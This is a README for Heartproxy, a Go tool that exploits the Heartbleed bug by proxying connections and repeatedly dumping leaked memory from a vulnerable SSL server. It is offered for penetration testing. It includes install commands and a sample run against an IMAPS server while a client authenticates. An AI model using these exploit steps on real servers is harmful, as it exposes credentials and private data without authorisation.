Heartproxy
==========
Heartbleed TCP to SSL proxy that constantly pulls leaked memory.

Use for pentesting to dump live memory chunks during an ongoing connection.

Based on work of Filippo Valsorda at https://github.com/FiloSottile/Heartbleed

Install
=======

```
go get github.com/mver/Heartproxy
go install github.com/mver/Heartproxy
```

Synopsis
========
Leaking 63000 Bytes from a vulnerable IMAPS server: 

``` 
[foo@bar/term1]$ Heartproxy 8080 mail.vulnerable.com:993 64000
2014/04/10 14:25:18 Using leaksize 63000
Listening on 8080
2014/04/10 14:25:25 New connection from: localhost
2014/04/10 14:25:25 Connected to target...
2014/04/10 14:25:25 starting up heartbeat collector
2014/04/10 14:25:25 starting up clientToTarget collector
2014/04/10 14:25:25 starting up targetToClient collector
...
```

```
[foo@bar/term2]$ telnet localhost 8080
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
AUTH ...
```
